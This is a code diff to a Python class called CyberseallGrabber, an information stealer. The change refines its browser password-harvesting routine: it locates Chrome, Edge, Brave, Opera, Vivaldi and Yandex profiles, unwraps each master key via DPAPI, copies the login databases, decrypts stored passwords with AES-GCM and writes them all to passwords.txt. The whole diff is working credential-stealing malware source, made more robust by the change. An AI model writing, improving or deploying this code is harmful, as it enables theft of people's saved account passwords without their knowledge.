@@ -173,81 +173,166 @@ class CyberseallGrabber:
         try:
             pw_data = []
             
-            def get_master_key(path):
+            def get_master_key(browser_path):
                 try:
-                    with open(path + "\\Local State", "r", encoding="utf-8") as f:
-                        c = f.read()
-                    local_state = json.loads(c)
-                    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-                    master_key = master_key[5:]
-                    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
-                    return master_key
-                except:
+                    local_state_path = os.path.join(browser_path, "Local State")
+                    if not os.path.exists(local_state_path):
+                        return None
+                    with open(local_state_path, "r", encoding="utf-8") as f:
+                        local_state = json.loads(f.read())
+                    encrypted_key = local_state["os_crypt"]["encrypted_key"]
+                    encrypted_key = base64.b64decode(encrypted_key.encode("utf-8"))
+                    encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
+                    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+                    return decrypted_key
+                except Exception as e:
                     return None
             
-            def decrypt_password(buff, master_key):
+            def decrypt_password(encrypted_password, master_key):
                 try:
-                    iv = buff[3:15]
-                    payload = buff[15:]
-                    cipher = AES.new(master_key, AES.MODE_GCM, iv)
-                    decrypted_pass = cipher.decrypt(payload)
-                    decrypted_pass = decrypted_pass[:-16].decode()
-                    return decrypted_pass
-                except:
-                    return "Failed to decrypt"
+                    # Check if password is encrypted with new method (AES)
+                    if encrypted_password[:3] == b'v10' or encrypted_password[:3] == b'v11':
+                        # Extract IV and encrypted data
+                        iv = encrypted_password[3:15]
+                        encrypted_data = encrypted_password[15:-16]  # Remove tag
+                        
+                        # Decrypt using AES-GCM
+                        cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
+                        decrypted_password = cipher.decrypt(encrypted_data)
+                        return decrypted_password.decode('utf-8')
+                    else:
+                        # Old method - use DPAPI
+                        decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
+                        return decrypted_password.decode('utf-8')
+                except Exception as e:
+                    try:
+                        # Fallback: try DPAPI directly
+                        decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
+                        return decrypted_password.decode('utf-8')
+                    except:
+                        return "Failed to decrypt"
             
-            # Browser-Pfade für Passwörter
+            # Browser configurations
             browsers = [
-                ("Chrome", os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default")),
-                ("Chrome Canary", os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome SxS", "User Data", "Default")),
-                ("Edge", os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default")),
-                ("Brave", os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default")),
-                ("Opera", os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable")),
-                ("Opera GX", os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable")),
-                ("Vivaldi", os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data", "Default")),
-                ("Yandex", os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data", "Default"))
+                {
+                    "name": "Chrome",
+                    "path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default"),
+                    "login_data": "Login Data"
+                },
+                {
+                    "name": "Chrome Canary",
+                    "path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome SxS", "User Data", "Default"),
+                    "login_data": "Login Data"
+                },
+                {
+                    "name": "Microsoft Edge",
+                    "path": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default"),
+                    "login_data": "Login Data"
+                },
+                {
+                    "name": "Brave",
+                    "path": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default"),
+                    "login_data": "Login Data"
+                },
+                {
+                    "name": "Opera",
+                    "path": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
+                    "login_data": "Login Data"
+                },
+                {
+                    "name": "Opera GX",
+                    "path": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable"),
+                    "login_data": "Login Data"
+                },
+                {
+                    "name": "Vivaldi",
+                    "path": os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data", "Default"),
+                    "login_data": "Login Data"
+                },
+                {
+                    "name": "Yandex",
+                    "path": os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data", "Default"),
+                    "login_data": "Ya Passman Data"
+                }
             ]
             
-            for browser_name, browser_path in browsers:
+            for browser in browsers:
                 try:
+                    browser_name = browser["name"]
+                    browser_path = browser["path"]
+                    login_data_file = browser["login_data"]
+                    
+                    # Check if browser exists
                     if not os.path.exists(browser_path):
                         continue
-                        
+                    
+                    # Get master key for decryption
                     master_key = get_master_key(browser_path)
                     if not master_key:
                         continue
-                        
-                    login_db = os.path.join(browser_path, "Login Data")
-                    if not os.path.exists(login_db):
+                    
+                    # Path to login data
+                    login_data_path = os.path.join(browser_path, login_data_file)
+                    if not os.path.exists(login_data_path):
                         continue
+                    
+                    # Copy database to temp location to avoid locks
+                    temp_db_path = os.path.join(os.getenv("TEMP"), f"{browser_name.replace(' ', '_')}_passwords_{os.getpid()}.db")
+                    try:
+                        shutil.copy2(login_data_path, temp_db_path)
+                    except:
+                        continue
+                    
+                    # Connect to database and extract passwords
+                    try:
+                        conn = sqlite3.connect(temp_db_path)
+                        cursor = conn.cursor()
                         
-                    # Kopiere die Datenbank in temp
-                    temp_db = os.path.join(os.getenv("TEMP"), f"{browser_name}_login.db")
-                    shutil.copy2(login_db, temp_db)
-                    
-                    conn = sqlite3.connect(temp_db)
-                    cursor = conn.cursor()
-                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-                    
-                    for row in cursor.fetchall():
-                        if row[0] and row[1] and row[2]:
-                            url = row[0]
+                        # Query for login data
+                        cursor.execute("SELECT origin_url, username_value, password_value FROM logins WHERE username_value != '' AND password_value != ''")
+                        
+                        for row in cursor.fetchall():
+                            origin_url = row[0]
                             username = row[1]
                             encrypted_password = row[2]
                             
-                            decrypted_password = decrypt_password(encrypted_password, master_key)
-                            pw_data.append(f"{browser_name} - {url} - {username} - {decrypted_password}")
+                            if origin_url and username and encrypted_password:
+                                # Decrypt password
+                                decrypted_password = decrypt_password(encrypted_password, master_key)
+                                
+                                # Format and add to results
+                                password_entry = f"{browser_name} | {origin_url} | {username} | {decrypted_password}"
+                                pw_data.append(password_entry)
+                        
+                        conn.close()
+                        
+                    except Exception as e:
+                        if 'conn' in locals():
+                            conn.close()
+                        continue
                     
-                    conn.close()
-                    os.remove(temp_db)
-                    
+                    # Clean up temp file
+                    try:
+                        os.remove(temp_db_path)
+                    except:
+                        pass
+                        
                 except Exception as e:
                     continue
             
+            # Save passwords to file
             self.p = pw_data
-            with open(os.path.join(self.d, "passwords.txt"), "w", encoding="utf-8") as f:
-                f.write("\n".join(pw_data))
-        except:
+            if pw_data:
+                try:
+                    with open(os.path.join(self.d, "passwords.txt"), "w", encoding="utf-8") as f:
+                        f.write("=== BROWSER PASSWORDS ===\n\n")
+                        for password in pw_data:
+                            f.write(password + "\n")
+                        f.write(f"\n=== TOTAL: {len(pw_data)} PASSWORDS ===")
+                except:
+                    pass
+            
+        except Exception as e:
             pass
 
     def fi(self):
